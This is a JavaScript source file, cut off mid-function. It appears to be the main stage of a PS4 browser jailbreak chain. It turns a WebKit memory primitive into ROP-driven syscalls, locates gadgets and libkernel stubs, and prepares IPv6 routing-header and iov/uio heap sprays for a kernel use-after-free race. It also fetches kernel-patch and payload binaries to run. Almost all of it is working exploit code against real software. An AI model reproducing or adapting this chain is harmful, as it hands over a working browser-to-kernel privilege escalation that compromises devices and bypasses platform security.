// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

// ============================================================
// AJUSTES RÁPIDOS — edita SOLO estos números y vuelve a subir el archivo
// ============================================================
const CFG_IOV_WORKERS   = 1;   // workers para el iov spray (recvmsg parked)
const CFG_UIO_WORKERS   = 1;   // workers para el UIO spray (readv/writev)
const CFG_ATTEMPTS      = 4;   // intentos del race
const CFG_MSDELAY       = 2;   // ms entre dup() y close()
const CFG_USE_REALTIME  = 0;   // 0 = sin pin RT; 1 = pinear a core 7
const CFG_USE_PAIR      = 0;   // 0 = sin promote; 1 = promote a pair
const CFG_VERBOSE       = 1;   // 1 = log completo; 0 = solo marcas importantes
// ============================================================

// ============================================================
// TELEMETRÍA — solo lectura, no altera el flujo del exploit.
// ============================================================
const TM = window.__TM = window.__TM || {
    startedAt: Date.now(), errors: [], stages: {}, diagnostics: {}
};
function tmStage(tag, detail) {
    try {
        const now = Date.now() - TM.startedAt;
        if (!TM.stages[tag]) {
            TM.stages[tag] = { count: 0, first: null, last: null, samples: [] };
        }
        const s = TM.stages[tag];
        s.count++;
        const text = String(detail || '').slice(0, 120);
        if (!s.first) s.first = { ts: now, detail: text };
        s.last = { ts: now, detail: text };
        if (s.samples.length < 3) s.samples.push({ ts: now, detail: text });
        if (window.__TM.render) window.__TM.render();
    } catch (e) { }
}
function tmDiag(name, value) {
    try {
        if (window.__TM) {
            window.__TM.diagnostics[name] = value;
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
}

function post(tag, detail) {
    try {
        tmStage(tag, detail);
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = CFG_VERBOSE === 1 || params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    try {
        if (window.__TM) {
            window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
            if (!ok) {
                window.__TM.errors.push({
                    ts: Date.now() - window.__TM.startedAt,
                    message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''),
                    file: 'chain_poops_v3.js', line: 0, col: 0, stack: ''
                });
            }
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
              socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
              readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,
              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };

// DEBUG: emitir la tabla SYS al inicio para confirmar que está bien
const SYS_NAMES = Object.keys(SYS);
console.log("[v3] SYS table has " + SYS_NAMES.length + " entries");

const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;

const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;

const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 15;
const MAX_ROUNDS_TRIPLET = 800;
const FIND_TRIPLET_FAST = 8000;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;

// Para el cleanup de emergencia
let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe = null;

(async function () {
    let p = null;
    let sc = null;

    try {
        const NUM_IOV_WORKER = CFG_IOV_WORKERS;
        const NUM_ATTEMPT = CFG_ATTEMPTS;
        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
        const MS_DELAY = CFG_MSDELAY;

        // DEBUG: verificar la tabla SYS al principio
        mark("SYS-TABLE", "entries=" + SYS_NAMES.length
            + " sendmsg=" + SYS.sendmsg + " dup=" + SYS.dup
            + " recvmsg=" + SYS.recvmsg + " close=" + SYS.close
            + " netcontrol=" + SYS.netcontrol + " socket=" + SYS.socket);

        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + CFG_UIO_WORKERS
            + " attempts=" + NUM_ATTEMPT + " msdelay=" + MS_DELAY
            + " rtp=" + CFG_USE_REALTIME + " pair=" + CFG_USE_PAIR
            + (STOP_BEFORE_DOUBLE ? " stop-before-double" : ""));

        tmDiag('fw_key', key);
        tmDiag('iov_workers', NUM_IOV_WORKER);
        tmDiag('uio_workers', CFG_UIO_WORKERS);
        tmDiag('attempts_max', NUM_ATTEMPT);
        tmDiag('ms_delay', MS_DELAY);
        tmDiag('use_realtime', CFG_USE_REALTIME);
        tmDiag('use_pair', CFG_USE_PAIR);

        let kpatch = null, payload = null;
        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch
            ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length
            : "MISSING");
        try {
            const r = await fetch("payload.bin");
            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " entry="
              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
            : "MISSING");

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 12,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        const PAIR_ON = CFG_USE_PAIR === 1;

        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + (pairStatus.error ? " error=" + pairStatus.error : ""));

        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) return;

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length,
            gated + "/" + GAD.length)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k])
            .filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);

        // DEBUG: listar los syscalls que FALTAN de la tabla stubAddr
        const missingStubs = [];
        for (const name in SYS) {
            if (!stubAddr.has(SYS[name])) missingStubs.push(name + "=" + hx(SYS[name]));
        }
        if (missingStubs.length) {
            mark("MISSING-STUBS", missingStubs.join(" "));
        } else {
            mark("MISSING-STUBS", "none -- all " + Object.keys(SYS).length + " resolved");
        }
        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0,
            miss.join(","))) return;

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                if (!argGadget[i] || typeof argGadget[i].low !== "number") {
                    throw new Error("layout: argGadget[" + i + "] is not an int64");
                }
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);

        let pivotCell = null;
        try {
            pivotCell = p.leakval(pivotObj);
        } catch (le) {
            mark("PIVOT-LEAKVAL-THREW", le.message);
        }
        if (!pivotCell || typeof pivotCell.low !== "number" || typeof pivotCell.hi !== "number") {
            mark("PIVOT-CELL-INVALID", "pivotCell=" + pivotCell
                + " -- primitiva inestable, aborting");
            state("PRIMITIVA INESTABLE -- reboot y reintenta", "bad");
            return;
        }
        mark("PIVOT-CELL", "pivotCell=" + pivotCell);
        p.write8(mainMf, G.G0);
        mainArmed = true;

        function callAddr(target, args) {
            if (!target || typeof target.low !== "number") {
                throw new Error("callAddr: target is not an int64 (" + target + ")");
            }
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            if (!saved || typeof saved.low !== "number") {
                throw new Error("callAddr: p.read8(pivotCell) returned " + saved);
            }
            if (!M.S || typeof M.S.low !== "number") {
                throw new Error("callAddr: M.S is not an int64 (" + M.S + ")");
            }
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true),
                     hi: M.frameDv.getUint32(4, true),
                     i32: M.frameDv.getUint32(0, true) | 0 };
        }

        // *** sc con debug detallado ***
        sc = function (num) {
            const a = Array.prototype.slice.call(arguments, 1);
            if (num === undefined || num === null || typeof num !== "number") {
                throw new Error("sc: num is " + num + " (type " + typeof num
                    + ") args=" + JSON.stringify(a.map(function(x) {
                        return String(x);
                    })));
            }
            const stub = stubAddr.get(num);
            if (!stub || typeof stub.low !== "number") {
                const availNums = Array.from(stubAddr.keys()).slice(0, 20).join(",");
                throw new Error("sc: no stub for syscall " + num
                    + " (0x" + (num >>> 0).toString(16) + "). "
                    + "available stubs (first 20): " + availNums);
            }
            return callAddr(stub, a);
        };

        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(0x10); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);

        function nanosleepMs(ms) {
            const sec = Math.floor(ms / 1000);
            const nsec = ((ms % 1000) * 1000000) >>> 0;
            lenDv.setUint32(0, sec, true);
            lenDv.setUint32(4, 0, true);
            lenDv.setUint32(8, nsec, true);
            lenDv.setUint32(12, 0, true);
            return sc(SYS.nanosleep, lenAddr, 0).i32;
        }

        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
        const leakU8 = new Uint8Array(leakAb);
        const R2_ON = params.get("r2") !== "0";
        let shortReads = 0;

        const burned = new Set();
        function burn(fd, why) {
            if (fd > 0 && !burned.has(fd)) {
                burned.add(fd);
                mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
            }
        }

        function buildRthdr(dv, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            new Uint8Array(dv.buffer).fill(0);
            dv.setUint8(0, 0); dv.setUint8(1, n * 2);
            dv.setUint8(2, 0); dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
            sprayAddr, sprayLen).i32;
        const freeRthdr = s => {
            if (burned.has(s)) {
                mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
                return -1;
            }
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };

        function getRthdr(s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, Math.min(size, UCRED_SIZE));
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        }
        function netevent(sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }

        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
        keepAlive.push(iovAb, msgAb);
        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);

        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, 1);
        put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0);
        put(msgDv, 0x10, iovAddr);
        msgDv.setInt32(0x18, NUM_MSG_IOV, true);

        state("setting up...", "warn");
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("socketpair failed");
        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("uio socketpair failed");
        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));

        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        check("karw-pipe-pairs-exist",
            masterPipe[0] > 0 && masterPipe[1] > 0
            && slavePipe[0] > 0 && slavePipe[1] > 0,
            "master " + masterPipe + "  slave " + slavePipe);

        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
        new Uint8Array(dummyAb).fill(0x41);
        const dummyAddr = bufAddr(dummyAb);
        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
        keepAlive.push(uioIovAb);
        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);

        new Uint8Array(uioIovAb).fill(0);
        put(uioIovDv, 0, dummyAddr);
        const ipv6 = [];
        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
            if (s === -1) break;
            ipv6.push(s);
        }
        _ipv6 = ipv6; _iovSs = iovSs; _uioSs = uioSs;
        _masterPipe = masterPipe; _slavePipe = slavePipe;

        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
            ipv6.length + "/" + NUM_IPV6_SOCK);

        function makeRpc(w, name) {
            let seq = 0;
            const pending = new Map();
            w.onmessage = function (e) {
                const d = e.data || {};
                const slot = pending.get(d.id);
                if (!slot) return;
                pending.delete(d.id);
                if (slot.timer) clearTimeout(slot.timer);
                if (d.type === "err") slot.reject(new Error(String(d.value)));
                else slot.resolve(d.value);
            };
            w.onerror = e => mark("WORKER-ONERROR", name + " "
                + ((e && e.message) ? e.message : String(e)));

            return function call(fname, timeoutMs, ...args) {
                return new Promise(function (resolve, reject) {
                    const id = seq++;
                    const timer = timeoutMs > 0 ? setTimeout(function () {
                        pending.delete(id);
                        reject(new Error(name + ": timeout waiting for " + fname));
                    }, timeoutMs) : null;
                    pending.set(id, { resolve, reject, timer });
                    w.postMessage({ id: id, name: fname, args: args });
                });
            };
        }
        function ptrish(v) { return v && v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }

        const NUM_UIO_WORKER = CFG_UIO_WORKERS;
        const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
        mark("WORKER-PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + NUM_UIO_WORKER
            + " total=" + TOTAL_WORKERS);
        for (let i = 0; i < TOTAL_WORKERS; ++i) {
            const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
            const w = { name: name, armed: false, wired: false };
            workers.push(w);
            try {
                w.worker = new Worker("rpc_worker.js");
                w.rpc = makeRpc(w.worker, name);
                if ((await w.rpc("ping", 5000)) !== "pong")
                    throw new Error(name + " did not answer ping");
                const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
                const arr = await w.rpc("init", 5000, sLo, sHi);
                keepAlive.push(arr);
                const D = bufAddr(arr.buffer);
                if ((p.read4(D) >>> 0) !== sLo)
                    throw new Error(name + ": transfer did not preserve the store");
                const storage = p.read8(D.add32(0x10));
                const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
                const bf = p.read8(mc.add32(8));
                let wm = null, wv = null, wl = null;
                for (let k = 1; k <= 8; ++k) {
                    const val = p.read8(bf.sub32(8 * k));
                    if (!ptrish(val)) continue;
                    const inl = p.read8(val.add32(0x10));
                    const len = p.read4(val.add32(0x18)) >>> 0;
                    if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                    else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                    else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
                }
                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
                w.master = wm; w.origVector = p.read8(wm.add32(0x10));
                p.write8(wm.add32(0x10), wv); w.wired = true;
                await w.rpc("setup", 5000, wl.low, wl.hi);
                await w.rpc("armPivot", 5000, G.G0.low, G.G0.hi);
                w.armed = true;
                w.ctx = makeCtx();
                mark("WORKER-UP", name + " ok");
            } catch (workerErr) {
                mark("WORKER-FAILED", name + " threw: "
                    + (workerErr && workerErr.message ? workerErr.message : String(workerErr)));
                try { if (w.worker) w.worker.terminate(); } catch (e) { }
                workers.pop();
                continue;
            }
            await new Promise(r => setTimeout(r, 100));
        }
        if (workers.length < 1) {
            mark("TOO-FEW-WORKERS", "only " + workers.length
                + " survived -- refusing to arm");
            state("TOO FEW WORKERS -- reboot and retry", "bad");
            return;
        }
        const iovWorkers = workers.filter(w => w.name.startsWith("iov"));
        const uioWorkers = workers.filter(w => w.name.startsWith("uio"));
        mark("WORKER-POOLS", "iov=" + iovWorkers.length
            + " uio=" + uioWorkers.length + " total=" + workers.length);

        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);

        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true);
        prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];

        async function restoreThreadAttrs(why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);

            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true);
            maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true);
